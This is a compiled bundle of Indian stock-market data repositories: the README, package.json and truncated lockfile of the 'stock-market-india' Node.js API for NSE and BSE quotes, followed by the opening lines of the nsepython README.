# ⚡ [QUANT-SOURCE-004] Consolidated Quant & Algo Trading Repositories
**Category**: `INDIAN_BROKERS_DHAN_KITE_FYERS` | **Repositories in this Source**: 3
**Generated**: QUANT_BUNDLE_004_INDIAN_BROKERS_DHAN_KITE_FYERS.md | **Target**: NotebookLM 290+ Quant Code Brain

---

## [1/3] Repository: stock-market-india (`VAULT_IN-QUANT-045_maanavshah__stock-market-india`)
- **Full Name**: `IN-QUANT-045_maanavshah__stock-market-india`
- **Description**: 
- **GitHub Stars**: 0
- **Source Pool**: `indian_quant_vault`

### Documentation & Overview (README.md)
# stock-market-india
A npm package which fetches data from Bombay & National Stock Exchange and provides an API to access it.


## National Stock Exchange (NSE) API

- Get the stock market status (open/closed)<br/>
Format: JSON<br/>
http://localhost:3000/get_market_status<br/>

- Get all the indices of NSE(change, year high and low, index order)<br/>
Format: JSON<br/>
http://localhost:3000/nse/get_indices<br/>

- Get the quotes of all indexes in NSE<br/>
Format: HTML<br/>
http://localhost:3000/nse/get_quotes<br/>

- Get the quotation data of the symbol (companyName) from NSE<br/>
Format: JSON<br/>
http://localhost:3000/nse/get_quote_info?companyName=TCS<br/>

- Get the quotation data of the symbols (companyNames) from NSE - JSON<br/>
Format: JSON<br/>
http://localhost:3000/nse/get_multiple_quote_info?companyNames=TCS,WIPRO,AND_MORE<br/>

- Get the top 10 gainers of NSE<br/>
Format: JSON<br/>
http://localhost:3000/nse/get_gainers<br/>

- Get the top 10 losers of NSE<br/>
Format: JSON<br/>
http://localhost:3000/nse/get_losers<br/>

- Get advances/declines of individual index, and the value if its changed or not<br/>
Format: JSON<br/>
http://localhost:3000/nse/get_incline_decline<br/>

- Get the information of all the companies in a single NSE index<br/>
Format: JSON<br/>
http://localhost:3000/nse/get_index_stocks?symbol=nifty<br/>

- Get the list of companies in provided NSE index with matching keyword data<br/>
Format: JSON<br/>
http://localhost:3000/nse/search_stocks?keyword=AXIS<br/>

- Get the intraday data of company in NSE<br/>
Format: XML<br/>
http://localhost:3000/nse/get_intra_day_data?companyName=TCS&time=1<br/>
http://localhost:3000/nse/get_intra_day_data?companyName=TCS&time=month<br/>

- Get 52 weeks all high stocks in NSE<br/>
Format: JSON<br/>
http://localhost:3000/nse/get_52_week_high<br/>

- Get 52 weeks all low stocks in NSE<br/>
Format: JSON<br/>
http://localhost:3000/nse/get_52_week_low<br/>

- Get the NSE stocks with highest values<br/>
Format: JSON<br/>
http://localhost:3000/nse/get_top_value_stocks<br/>

- Get the NSE stocks with highest sold volumes<br/>
Format: JSON<br/>
http://localhost:3000/nse/get_top_volume_stocks<br/>

- Get the futures data for a company stock (symbol) and time<br/>
Format: JSON<br/>
http://localhost:3000/nse/get_stock_futures_data?companyName=TCS&time=15<br/>
http://localhost:3000/nse/get_stock_futures_data?companyName=VEDL&time=month<br/>

- Get chart data of a company name(symbol) depending on time in NSE<br/>
Format: CSV Format (delimiter - |)<br/>
http://localhost:3000/nse/get_chart_data_new?companyName=VEDL&time=5<br/>
http://localhost:3000/nse/get_chart_data_new?companyName=VEDL&time=year<br/>

- symbol (Slug List)

```javascript

 {
  'NIFTY 50': 'nifty',
  'NIFTY NEXT 50': 'juniorNifty',
  'NIFTY MIDCAP 50': 'niftyMidcap50',
  'NIFTY AUTO': 'cnxAuto',
  'NIFTY BANK': 'bankNifty',
  'NIFTY ENERGY': 'cnxEnergy',
  'NIFTY FIN SERVICE': 'cnxFinance',
  'NIFTY FMCG': 'cnxFMCG',
  'NIFTY IT': 'cnxit',
  'NIFTY MEDIA': 'cnxMedia',
  'NIFTY METAL': 'cnxMetal',
  'NIFTY PHARMA': 'cnxPharma',
  'NIFTY PSU BANK': 'cnxPSU',
  'NIFTY REALTY': 'cnxRealty',
  'NIFTY PVT BANK': 'niftyPvtBank',
  'NIFTY COMMODITIES': 'cnxCommodities',
  'NIFTY CONSUMPTION': 'cnxConsumption',
  'NIFTY CPSE': 'cpse',
  'NIFTY INFRA': 'cnxInfra',
  'NIFTY MNC': 'cnxMNC',
  'NIFTY GROWSECT 15': 'ni15',
  'NIFTY PSE': 'cnxPSE',
  'NIFTY SERV SECTOR': 'cnxService',
  'NIFTY100 LIQ 15': 'nseliquid',
  'NIFTY MID LIQ 15': 'niftyMidcapLiq15',
  'NIFTY DIV OPPS 50': 'cnxDividendOppt',
  'NIFTY50 VALUE 20': 'nv20',
  'NIFTY QUALITY 30': 'niftyQuality30',
  'NIFTY50 EQL WGT': 'nifty50EqualWeight',
  'NIFTY100 EQL WGT': 'nifty100EqualWeight',
  'NIFTY100 LOWVOL30': 'nifty100LowVolatility30',
  'NIFTY ALPHA 50': 'niftyAlpha50',


  'INDIA VIX': '-',
  'NIFTY 100': '-',
  'NIFTY 500': '-',
  'NIFTY MIDCAP 100': '-',
  'NIFTY GS 11 15YR': '-',
  'NIFTY50 PR 1X INV': '-',
  'NIFTY GS COMPSITE': '-',
  'NIFTY GS 15YRPLUS': '-',
  'NIFTY50 PR 2X LEV': '-',
  'NIFTY50 TR 1X INV': '-',
  'NIFTY 200': '-',
  'NIFTY GS 4 8YR': '-',
  'NIFTY GS 8 13YR': '-',
  'NIFTY50 TR 2X LEV': '-',
  'NIFTY50 DIV POINT': '-',
  'NIFTY SMLCAP 100': '-',
  'NIFTY GS 10YR': '-',
  'NIFTY GS 10YR CLN': '-',
};

```

- companyName

```javascript

[ ACC, ADANIENT, ADANIPORTS, ADANIPOWER, AJANTPHARM, ALBK, AMARAJABAT, AMBUJACEM, APOLLOHOSP, APOLLOTYRE, ARVIND, ASHOKLEY, ASIANPAINT, AUROPHARMA, AXISBANK, BAJAJ-AUTO, BAJFINANCE, BAJAJFINSV, BALKRISIND, BANKBARODA, BANKINDIA, BATAINDIA, BEML, BERGEPAINT, BEL, BHARATFIN, BHARATFORG, BPCL, BHARTIARTL, INFRATEL, BHEL, BIOCON, BOSCHLTD, BRITANNIA, CADILAHC, CANFINHOME, CANBK, CAPF, CASTROLIND, CEATLTD, CENTURYTEX, CESC, CGPOWER, CHENNPETRO, CHOLAFIN, CIPLA, COALINDIA, COLPAL, CONCOR, CUMMINSIND, DABUR, DCBBANK, DHFL, DISHTV, DIVISLAB, DLF, DRREDDY, EICHERMOT, ENGINERSIN, EQUITAS, ESCORTS, EXIDEIND, FEDERALBNK, GAIL, GLENMARK, GMRINFRA, GODFRYPHLP, GODREJCP, GODREJIND, GRASIM, GSFC, HAVELLS, HCLTECH, HDFCBANK, HDFC, HEROMOTOCO, HEXAWARE, HINDALCO, HINDPETRO, HINDUNILVR, HINDZINC, ICICIBANK, ICICIPRULI, IDBI, IDEA, IDFCBANK, IDFC, IFCI, IBULHSGFIN, INDIANB, IOC, IGL, INDUSINDBK, INFIBEAM, INFY, INDIGO, IRB, ITC, JISLJALEQS, JPASSOCIAT, JETAIRWAYS, JINDALSTEL, JSWSTEEL, JUBLFOOD, JUSTDIAL, KAJARIACER, KTKBANK, KSCL, KOTAKBANK, KPIT, L&TFH, LT, LICHSGFIN, LUPIN, M&MFIN, MGL, M&M, MANAPPURAM, MRPL, MARICO, MARUTI, MFSL, MINDTREE, MOTHERSUMI, MRF, MCX, MUTHOOTFIN, NATIONALUM, NBCC, NCC, NESTLEIND, NHPC, NIITTECH, NMDC, NTPC, ONGC, OIL, OFSS, ORIENTBANK, PAGEIND, PCJEWELLER, PETRONET, PIDILITIND, PEL, PFC, POWERGRID, PTC, PNB, PVR, RAYMOND, RBLBANK, RELCAPITAL, RCOM, RELIANCE, RELINFRA, RPOWER, REPCOHOME, RECLTD, SHREECEM, SRTRANSFIN, SIEMENS, SREINFRA, SRF, SBIN, SAIL, STAR, SUNPHARMA, SUNTV, SUZLON, SYNDIBANK, TATACHEM, TATACOMM, TCS, TATAELXSI, TATAGLOBAL, TATAMTRDVR, TATAMOTORS, TATAPOWER, TATASTEEL, TECHM, INDIACEM, RAMCOCEM, SOUTHBANK, TITAN, TORNTPHARM, TORNTPOWER, TV18BRDCST, TVSMOTOR, UJJIVAN, ULTRACEMCO, UNIONBANK, UBL, MCDOWELL-N, UPL, VEDL, VGUARD, VOLTAS, WIPRO, WOCKPHARMA, YESBANK, ZEEL ]

```

- time

```javascript

var time = [1, 5, 15, 30, 60, 'week', 'month', 'year'] minutes

```

## Bombay Stock Exchange (BSE) API

- Get details of all index in BSE Stock exchange<br/>
Format: JSON<br/>
http://localhost:3000/bse/get_indices<br/>

- Get all the indices of NSE(Get the information of only a single index<br/>
Format: JSON<br/>
http://localhost:3000/bse/getIndexInfo?indexId=16<br/>

- Get todays closing data and daily data of past time using IndexId and time from BSE<br/>
Format: JSON<br/>
http://localhost:3000/bse/get_index_chart_data?indexId=16<br/>

- Get details of all the stocks in an index<br/>
Format: JSON<br/>
http://localhost:3000/bse/get_index_stocks?indexId=16<br/>

- Gets the StockValue, Volume for company in specified past time<br/>
// 500112 - symbol (securityCode) of SBIN stock BSE<br/>
Format: JSON<br/>
http://localhost:3000/bse/get_company_info?companyKey=500112<br/>

- Get the stocks chart data<br/>
Format: JSON<br/>
http://localhost:3000/bse/get_stocks_chart_data?companyKey=500325&time=5<br/>
http://localhost:3000/bse/get_stocks_chart_data?companyKey=500325&time=month<br/>

- Get BSE stock data of stock info and day chart<br/>
Format: HTML<br/>
http://localhost:3000/bse/get_stock_info_and_day_chart_data?companyKey=500325<br/>

- Get the top gainers of BSE stock exchange<br/>
Format: JSON<br/>
http://localhost:3000/bse/get_gainers<br/>

- Get the top losers of BSE stock exchange<br/>
Format: JSON<br/>
http://localhost:3000/bse/get_losers<br/>

- Get the top turnovers of BSE stock exchange<br/>
Format: JSON<br/>
http://localhost:3000/bse/getTopTurnOvers<br/>

- indexId (symbolKey)

**`symbolKey` is different from `symbol` or `securityCode`, this value is present in response of getIndices method in 'key' property**

**valid symbols for Index Futures and Options are `["BANKNIFTY","FTSE100","NIFTY","NIFTYINFRA","NIFTYIT","NIFTYMID50","NIFTYPSE"]`**

- companyKey

You can check the company key values using:

```javascript

https://github.com/maanavshah/stock-market-india/bse/constant/names.js

```

- time

```javascript

var time = [1, 5, 15, 30, 60, 'week', 'month', 'year'] minutes

```

## INSTALLATION

Let's get step by step here.

**Identify the location for your application.**

First identify the location for your application. Let's take it as /home/user/your_app. The path doesn’t matter, so feel free to locate the directory wherever it is best for you.

**Installing Node.js**

Here is where we will set up Node.js and Express. Node.js is a framework and Express provides a web server. The webserver we need does not need to do anything fancy. The only feature that the webserver needs are the ability to provide static files.

To get started download and install Node.JS: [nodejs.org](http://nodejs.org/)

**Install Express**

Express is a package that executes within Node.js. To install express, in the Command Prompt navigate to your directory for the application which is  /home/user/your_app.

Now let's install Express as a package for Node.js. At the command prompt type “npm install express”. That installed Express and should have created a directory called “node_modules”. 

**Start Express Web Server in Node.js**

In the terminal confirm you are at the  /home/user/your_app directory and execute the following command.

> node app.js 3000

Now the webserver should be running on port 3000 and you should be able to access the APIs.

## IMPORTANT

> API Calls will fail when made from browser due to 'OPTIONS' request sent by browsers before making an API call and Have few 'insecure' headers set which fails when changed from browser.

> We Get all the indices of NSE (work around to make the call either on your server or in your app).

### Contributing

Bug reports and pull requests are welcome on GitHub at https://github.com/maanavshah/stock-market-india. This project is intended to be a safe, welcoming space for collaboration, and contributors are expected to adhere to the [Contributor Covenant](http://contributor-covenant.org) code of conduct.
I give credits to https://github.com/kaushiknishchay/indian-stock-exchange, using which it was possible for me to create the library.

### License

The content of this repository is licensed under [MIT LICENSE](LICENSE).

### Core Implementation Code & Architecture
#### File: `package.json`
```python
{
  "name": "stock-market-india",
  "version": "1.0.0",
  "description": "\"An API Library which fetches data from Bombay Stock Exchange and National Stock Exchange and returns data in JSON format.\"",
  "main": "app.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "start": "node app.js 3000"
  },
  "repository": {
    "type": "git",
    "url": "git+https://github.com/maanavshah/stock-market-india.git"
  },
  "keywords": [
    "api",
    "indian",
    "stock",
    "market",
    "exchange",
    "api",
    "BSE",
    "NSE",
    "node",
    "express"
  ],
  "author": "Maanav Shah",
  "license": "MIT",
  "bugs": {
    "url": "https://github.com/maanavshah/stock-market-india/issues"
  },
  "homepage": "https://github.com/maanavshah/stock-market-india#readme",
  "dependencies": {
    "axios": "^0.18.1",
    "express": "^4.16.4",
    "indian-stock-exchange": "^1.3.33",
    "loadash": "^1.0.0"
  }
}
```

#### File: `package-lock.json`
```python
{
  "name": "stock-market-india",
  "version": "1.0.0",
  "lockfileVersion": 1,
  "requires": true,
  "dependencies": {
    "accepts": {
      "version": "1.3.5",
      "resolved": "https://registry.npmjs.org/accepts/-/accepts-1.3.5.tgz",
      "integrity": "sha1-63d99gEXI6OxTopywIBcjoZ0a9I=",
      "requires": {
        "mime-types": "~2.1.18",
        "negotiator": "0.6.1"
      }
    },
    "array-flatten": {
      "version": "1.1.1",
      "resolved": "https://registry.npmjs.org/array-flatten/-/array-flatten-1.1.1.tgz",
      "integrity": "sha1-ml9pkFGx5wczKPKgCJaLZOopVdI="
    },
    "axios": {
      "version": "0.18.1",
      "resolved": "https://registry.npmjs.org/axios/-/axios-0.18.1.tgz",
      "integrity": "sha512-0BfJq4NSfQXd+SkFdrvFbG7addhYSBA2mQwISr46pD6E5iqkWg02RAs8vyTT/j0RTnoYmeXauBuSv1qKwR179g==",
      "requires": {
        "follow-redirects": "1.5.10",
        "is-buffer": "^2.0.2"
      }
    },
    "body-parser": {
      "version": "1.18.3",
      "resolved": "https://registry.npmjs.org/body-parser/-/body-parser-1.18.3.tgz",
      "integrity": "sha1-WykhmP/dVTs6DyDe0FkrlWlVyLQ=",
      "requires": {
        "bytes": "3.0.0",
        "content-type": "~1.0.4",
        "debug": "2.6.9",
        "depd": "~1.1.2",
        "http-errors": "~1.6.3",
        "iconv-lite": "0.4.23",
        "on-finished": "~2.3.0",
        "qs": "6.5.2",
        "raw-body": "2.3.3",
        "type-is": "~1.6.16"
      },
      "dependencies": {
        "debug": {
          "version": "2.6.9",
          "resolved": "https://registry.npmjs.org/debug/-/debug-2.6.9.tgz",
          "integrity": "sha512-bC7ElrdJaJnPbAP+1EotYvqZsb3ecl5wi6Bfi6BJTUcNowp6cvspg0jXznRTKDjm/E7AdgFBVeAPVMNcKGsHMA==",
          "requires": {
            "ms": "2.0.0"
          }
        }
      }
    },
    "bytes": {
      "version": "3.0.0",
      "resolved": "https://registry.npmjs.org/bytes/-/bytes-3.0.0.tgz",
      "integrity": "sha1-0ygVQE1olpn4Wk6k+odV3ROpYEg="
    },
    "content-disposition": {
      "version": "0.5.2",
      "resolved": "https://registry.npmjs.org/content-disposition/-/content-disposition-0.5.2.tgz",
      "integrity": "sha1-DPaLud318r55YcOoUXjLhdunjLQ="
    },
    "content-type": {
      "version": "1.0.4",
      "resolved": "https://registry.npmjs.org/content-type/-/content-type-1.0.4.tgz",
      "integrity": "sha512-hIP3EEPs8tB9AT1L+NUqtwOAps4mk2Zob89MWXMHjHWg9milF/j4osnnQLXBCBFBk/tvIG/tUc9mOUJiPBhPXA=="
    },
    "cookie": {
      "version": "0.3.1",
      "resolved": "https://registry.npmjs.org/cookie/-/cookie-0.3.1.tgz",
      "integrity": "sha1-5+Ch+e9DtMi6klxcWpboBtFoc7s="
    },
    "cookie-signature": {
      "version": "1.0.6",
      "resolved": "https://registry.npmjs.org/cookie-signature/-/cookie-signature-1.0.6.tgz",
      "integrity": "sha1-4wOogrNCzD7oylE6eZmXNNqzriw="
    },
    "debug": {
      "version": "3.1.0",
      "resolved": "https://registry.npmjs.org/debug/-/debug-3.1.0.tgz",
      "integrity": "sha512-OX8XqP7/1a9cqkxYw2yXss15f26NKWBpDXQd0/uK/KPqdQhxbPa994hnzjcE2VqQpDslf55723cKPUOGSmMY3g==",
      "requires": {
        "ms": "2.0.0"
      }
    },
    "depd": {
      "version": "1.1.2",
      "resolved": "https://registry.npmjs.org/depd/-/depd-1.1.2.tgz",
      "integrity": "sha1-m81S4UwJd2PnSbJ0xDRu0uVgtak="
    },
    "destroy": {
      "version": "1.0.4",
      "resolved": "https://registry.npmjs.org/destroy/-/destroy-1.0.4.tgz",
      "integrity": "sha1-l4hXRCxEdJ5CBmE+N5RiBYJqvYA="
    },
    "ee-first": {
      "version": "1.1.1",
      "resolved": "https://registry.npmjs.org/ee-first/-/ee-first-1.1.1.tgz",
      "integrity": "sha1-WQxhFWsK4vTwJVcyoViyZrxWsh0="
    },
    "encodeurl": {
      "version": "1.0.2",
      "resolved": "https://registry.npmjs.org/encodeurl/-/encodeurl-1.0.2.tgz",
      "integrity": "sha1-rT/0yG7C0CkyL1oCw6mmBslbP1k="
    },
    "escape-html": {
      "version": "1.0.3",
      "resolved": "https://registry.npmjs.org/escape-html/-/escape-html-1.0.3.tgz",
      "integrity": "sha1-Aljq5NPQwJdN4cFpGI7wBR0dGYg="
    },
    "etag": {
      "version": "1.8.1",
      "resolved": "https://registry.npmjs.org/etag/-/etag-1.8.1.tgz",
      "integrity": "sha1-Qa4u62XvpiJorr/qg6x9eSmbCIc="
    },
    "express": {
      "version": "4.16.4",
      "resolved": "https://registry.npmjs.org/express/-/express-4.16.4.tgz",
      "integrity": "sha512-j12Uuyb4FMrd/qQAm6uCHAkPtO8FDTRJZBDd5D2KOL2eLaz1yUNdUB/NOIyq0iU4q4cFarsUCrnFDPBcnksuOg==",
      "requires": {
        "accepts": "~1.3.5",
        "array-flatten": "1.1.1",
        "body-parser": "1.18.3",
        "content-disposition": "0.5.2",
        "content-type": "~1.0.4",
        "cookie": "0.3.1",
        "cookie-signature": "1.0.6",
        "debug": "2.6.9",
        "depd": "~1.1.2",
        "encodeurl": "~1.0.2",
        "escape-html": "~1.0.3",
        "etag": "~1.8.1",
        "finalhandler": "1.1.1",
        "fresh": "0.5.2",
        "merge-descriptors": "1.0.1",
        "methods": "~1.1.2",
        "on-finished": "~2.3.0",
        "parseurl": "~1.3.2",
        "path-to-regexp": "0.1.7",
        "proxy-addr": "~2.0.4",
        "qs": "6.5.2",
        "range-parser": "~1.2.0",
        "safe-buffer": "5.1.2",
        "send": "0.16.2",
        "serve-static": "1.13.2",
        "setprototypeof": "1.1.0",
        "statuses": "~1.4.0",
        "type-is": "~1.6.16",
        "utils-merge": "1.0.1",
        "vary": "~1.1.2"
      },
      "dependencies": {
        "debug": {
          "version": "2.6.9",
          "resolved": "https://registry.npmjs.org/debug/-/debug-2.6.9.tgz",
          "integrity": "sha512-bC7ElrdJaJnPbAP+1EotYvqZsb3ecl5wi6Bfi6BJTUcNowp6cvspg0jXznRTKDjm/E7AdgFBVeAPVMNcKGsHMA==",
          "requires": {
            "ms": "2.0.0"
          }
        }
      }
    },
    "finalhandler": {
      "version": "1.1.1",
      "resolved": "http://registry.npmjs.org/finalhandler/-/finalhandler-1.1.1.tgz",
      "integrity": "sha512-Y1GUDo39ez4aHAw7MysnUD5JzYX+WaIj8I57kO3aEPT1fFRL4sr7mjei97FgnwhAyyzRYmQZaTHb2+9uZ1dPtg==",
      "requires": {
        "debug": "2.6.9",
        "encodeurl": "~1.0.2",
        "escape-html": "~1.0.3",
        "on-finished": "~2.3.0",
        "parseurl": "~1.3.2",
        "statuses": "~1.4.0",
        "unpipe": "~1.0.0"
      },
      "dependencies": {
        "debug": {
          "version": "2.6.9",
          "resolved": "https://registry.npmjs.org/debug/-/debug-2.6.9.tgz",
          "integrity": "sha512-bC7ElrdJaJnPbAP+1EotYvqZsb3ecl5wi6Bfi6BJTUcNowp6cvspg0jXznRTKDjm/E7AdgFBVeAPVMNcKGsHMA==",
          "requires": {
            "ms": "2.0.0"
          }
        }
      }
    },
    "follow-redirects": {
      "version": "1.5.10",
      "resolved": "https://registry.npmjs.org/follow-redirects/-/follow-redirects-1.5.10.tgz",
      "integrity": "sha512-0V5l4Cizzvqt5D44aTXbFZz+FtyXV1vrDN6qrelxtfYQKW0KO0W2T/hkE8xvGa/540LkZlkaUjO4ailYTFtHVQ==",
      "requires": {
        "debug": "=3.1.0"
      }
    },
    "forwarded": {
      "version": "0.1.2",
      "resolved": "https://registry.npmjs.org/forwarded/-/forwarded-0.1.2.tgz",
      "integrity": "sha1-mMI9qxF1ZXuMBXPozszZGw/xjIQ="
    },
    "fresh": {
      "version": "0.5.2",
      "resolved": "https://registry.npmjs.org/fresh/-/fresh-0.5.2.tgz",
      "integrity": "sha1-PYyt2Q2XZWn6g1qx+OSyOhBWBac="
    },
    "http-errors": {
      "version": "1.6.3",
      "resolved": "http://registry.npmjs.org/http-errors/-/http-errors-1.6.3.tgz",
      "integrity": "sha1-i1VoC7S+KDoLW/TqLjhYC+HZMg0=",
      "requires": {
        "depd": "~1.1.2",
        "inherits": "2.0.3",
        "setprototypeof": "1.1.0",
        "statuses": ">= 1.4.0 < 2"
      }
    },
    "iconv-lite": {
      "version": "0.4.23",
      "resolved": "https://registry.npmjs.org/iconv-lite/-/iconv-lite-0.4.23.tgz",
      "integrity": "sha512-neyTUVFtahjf0mB3dZT77u+8O0QB89jFdnBkd5P1JgYPbPaia3gXXOVL2fq8VyU2gMMD7SaN7QukTB/pmXYvDA==",
      "requires": {
        "safer-buffer": ">= 2.1.2 < 3"
      }
    },
    "indian-stock-exchange": {
      "version": "1.3.33",
      "resolved": "https://registry.npmjs.org/indian-stock-exchange/-/indian-stock-exchange-1.3.33.tgz",
      "integrity": "sha512-3/QCu1HymIgWDC+ryxnLKG5JmqYRskhPbxLA14pKmEN3CjphxVkWkgi9QbEHpar8thre4RhWuvJWTZGOUWLUPg==",
      "requires": {
        "axios": "^0.18.0",
        "lodash": "^4.17.10"
      }
    },
    "inherits": {
      "version": "2.0.3",
      "resolved": "https://registry.npmjs.org/inherits/-/inherits-2.0.3.tgz",
      "integrity": "sha1-Yzwsg+PaQqUC9SRmAiSA9CCCYd4="
    },
    "ipaddr.js": {
      "version": "1.8.0",
      "resolved": "https://registry.npmjs.org/ipaddr.js/-/ipaddr.js-1.8.0.tgz",
      "integrity": "sha1-6qM9bd16zo9/b+DJygRA5wZzix4="
    },
    "is-buffer": {
      "version": "2.0.4",
      "resolved": "https://registry.npmjs.org/is-buffer/-/is-buffer-2.0.4.tgz",
      "integrity": "sha512-Kq1rokWXOPXWuaMAqZiJW4XxsmD9zGx9q4aePabbn3qCRGedtH7Cm+zV8WETitMfu1wdh+Rvd6w5egwSngUX2A=="
    },
    "loadash": {
      "version": "1.0.0",
      "resolved": "https://registry.npmjs.org/loadash/-/loadash-1.0.0.tgz",
      "integrity": "sha512-xlX5HBsXB3KG0FJbJJG/3kYWCfsCyCSus3T+uHVu6QL6YxAdggmm3QeyLgn54N2yi5/UE6xxL5ZWJAAiHzHYEg=="
    },
    "lodash": {
      "version": "4.17.15",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.15.tgz",
      "integrity": "sha512-8xOcRHvCjnocdS5cpwXQXVzmmh5e5+saE2QGoeQmbKmRS6J3VQppPOIt0MnmE+4xlZoumy0GPG0D0MVIQbNA1A=="
    },
    "media-typer": {
      "version": "0.3.0",
      "resolved": "http://registry.npmjs.org/media-typer/-/media-typer-0.3.0.tgz",
      "integrity": "sha1-hxDXrwqmJvj/+hzgAWhUUmMlV0g="
    },
    "merge-descriptors": {
      "version": "1.0.1",
      "resolved": "https://registry.npmjs.org/merge-descriptors/-/merge-descriptors-1.0.1.tgz",
      "integrity": "sha1-sAqqVW3YtEVoFQ7J0blT8/kMu2E="
    },
    "methods": {
      "version": "1.1.2",
      "resolved": "https://registry.npmjs.org/methods/-/methods-1.1.2.tgz",
      "integrity": "sha1-VSmk1nZUE07cxSZmVoNbD4Ua/O4="
    },
    "mime": {
      "version": "1.4.1",
      "resolved": "https://registry.npmjs.org/mime/-/mime-1.4.1.tgz",
      "integrity": "sha512-KI1+qOZu5DcW6wayYHSzR/tXKCDC5Om4s1z2QJjDULzLcmf3DvzS7oluY4HCTrc+9FiKmWUgeNLg7W3uIQvxtQ=="
    },
    "mime-db": {
      "version": "1.37.0",
      "resolved": "https://registry.npmjs.org/mime-db/-/mime-db-1.37.0.tgz",
      "integrity": "sha512-R3C4db6bgQhlIhPU48fUtdVmKnflq+hRdad7IyKhtFj06VPNVdk2RhiYL3UjQIlso8L+YxAtFkobT0VK+S/ybg=="
    },
    "mime-types": {
      "version": "2.1.21",
      "resolved": "https://registry.npmjs.org/mime-types/-/mime-types-2.1.21.tgz",
      "integrity": "sha512-3iL6DbwpyLzjR3xHSFNFeb9Nz/M8WDkX33t1GFQnFOllWk8pOrh/LSrB5OXlnlW5P9LH73X6loW/eogc+F5lJg==",
      "requires": {
        "mime-db": "~1.37.0"
      }
    },
    "ms": {
      "version": "2.0.0",
      "resolved": "https://registry.npmjs.org/ms/-/ms-2.0.0.tgz",
      "integrity": "sha1-VgiurfwAvmwpAd9fmGF4jeDVl8g="
    },
    "negotiator": {
      "version": "0.6.1",
      "resolved": "https://registry.npmjs.org/negotiator/-/negotiator-0.6.1.tgz",
      "integrity": "sha1-KzJxhOiZIQEXeyhWP7XnECrNDKk="
    },
    "on-finished": {
      "version": "2.3.0",
      "resolved": "https://registry.npmjs.org/on-finished/-/on-finished-2.3.0.tgz",
      "integrity": "sha1-IPEzZIGwg811M3mSoWlxqi2QaUc=",
      "requires": {
        "ee-first": "1.1.1"
      }
    },
    "parseurl": {
      "version": "1.3.2",
      "resolved": "https://registry.npmjs.org/parseurl/-/parseurl-1.3.2.tgz",
      "integrity": "sha1-/CidTtiZMRlGDBViUyYs3I3mW/M="
    },
    "path-to-regexp": {
      "version": "0.1.7",
      "resolved": "https://registry.npmjs.org/path-to-regexp/-/path-to-regexp-0.1.7.tgz",
      "integrity": "sha1-32BBeABfUi8V60SQ5yR6G/qmf4w="
    },
    "proxy-addr": {
      "version": "2.0.4",
      "resolved": "https://registry.npmjs.org/proxy-addr/-/proxy-addr-2.0.4.tgz",
      "integrity": "sha512-5erio2h9jp5CHGwcybmxmVqHmnCBZeewlfJ0pex+UW7Qny7OOZXTtH56TGNyBizkgiOwhJtMKrVzDTeKcySZwA==",
      "requires": {
        "forwarded": "~0.1.2",
        "ipaddr.js": "1.8.0"
      }
    },
    "qs": {
      "version": "6.5.2",
      "resolved": "https://registry.npmjs.org/qs/-/qs-6.5.2.tgz",
      "integrity": "sha512-N5ZAX4/LxJmF+7wN74pUD6qAh9/wnvdQcjq9TZjevvXzSUo7bfmw91saqMjzGS2xq91/odN2dW/WOl7qQHNDGA=="
    },
    "range-parser": {
      "version": "1.2.0",
      "resolved": "https://registry.npmjs.org/range-parser/-/range-parser-1.2.0.tgz",
      "integrity": "sha1-9JvmtIeJTdxA3MlKMi9hEJLgDV4="
    },
    "raw-body": {
      "version": "2.3.3",
      "resolved": "https://registry.npmjs.org/raw-body/-/raw-body-2.3.3.tgz",
      "integrity": "sha512-9esiElv1BrZoI3rCDuOuKCBRbuApGGaDPQfjSflGxdy4oyzqghxu6klEkkVIvBje+FF0BX9coEv8KqW6X/7njw==",
      "requires": {
        "bytes": "3.0.0",
        "http-errors": "1.6.3",
        "iconv-lite": "0.4.23",
        "unpipe": "1.0.0"
      }
    },
    "safe-buffer": {
      "version": "5.1.2",
      "resolved": "https://registry.npmjs.org/safe-buffer/-/safe-buffer-5.1.2.tgz",
      "integrity": "sha512-Gd2UZBJDkXlY7GbJxfsE8/nvKkUEU1G38c1siN6QP6a9PT9MmHB8GnpscSmMJSoF8LOIrt8ud/wPtojys4G6+g=="
    },
    "safer-buffer": {
      "version": "2.1.2",
      "resolved": "https://registry.npmjs.org/safer-buffer/-/safer-buffer-2.1.2.tgz",
      "integrity": "sha512-YZo3K82SD7Riyi0E1EQPojLz7kpepnSQI9IyPbHHg1XXXevb5dJI7tpyN2ADxGcQbHG7vcyRHk0cbwqcQriUtg=="
    },
    "send": {
      "version": "0.16.2",
      "resolved": "https://registry.npmjs.org/send/-/send-0.16.2.tgz",
      "integrity": "sha512-E64YFPUssFHEFBvpbbjr44NCLtI1AohxQ8ZSiJjQLskAdKuriYEP6VyGEsRDH8ScozGpkaX1BGvhanqCwkcEZw==",
      "requires": {
        "debug": "2.6.9",
        "depd": "~1.1.2",
        "destroy": "~1.0.4",
        "encodeurl": "~1.0.2",
        "escape-html": "~1.0.3",
        "etag": "~1.8.1",
        "fresh": "0.5.2",
        "http-errors": "~1.6.2",
        "mime": "1.4.1",
        "ms": "2.0.0",
        "on-finished": "~2.3.0",
        "range-parser": "~1.2.0",
        "statuses": "~1.4.0"
      },
      "dependencies": {
        "debug": {
          "version": "2.6.9",
          "resolved": "https://registry.npmjs.org/debug/-/debug-2.6.9.tgz",
          "integrity": "sha512-bC7ElrdJaJnPbAP+1EotYvqZsb3ecl5wi6Bfi6BJTUcNowp6cvspg0jXznRTKDjm/E7AdgFBVeAPVMNcKGsHMA==",
          "requires": {
            "ms": "2.0.0"
          }
        }
      }
    },
    "serve-static": {
      "version": "1.13.2",
      "resolved": "https://registry.npmjs.org/serve-static/-/serve-static-1.13.2.tgz",
      "integrity": "sha512-p/tdJrO4U387R9oMjb1oj7qSMaMfmOyd4j9hOFoxZe2baQszgHcSWjuya/CiT5kgZZKRudHNOA0pYXOl8rQ5nw==",
      "requires": {
        "encodeurl": "~1.0.2",
        "escape-html": "~1.0.3",
        "parseurl": "~1.3.2",
        "send": "0.16.2"
      }
    },
    "setprototypeof": {
      "version": "1.1.0",
      "resolved": "https://registry.npmjs.org/setprototypeof/-/
# ... [TRUNCATED FILE CONTENT]
```


==================================================


## [2/3] Repository: nsepython (`WHEEL_nsepython`)
- **Full Name**: `nsepython`
- **Description**: 
- **GitHub Stars**: 0
- **Source Pool**: `cloned_trading_wheels`

### Documentation & Overview (README.md)
<p align="left">
  <a href="https://aeron7.github.io/nsepython/" target="_blank">
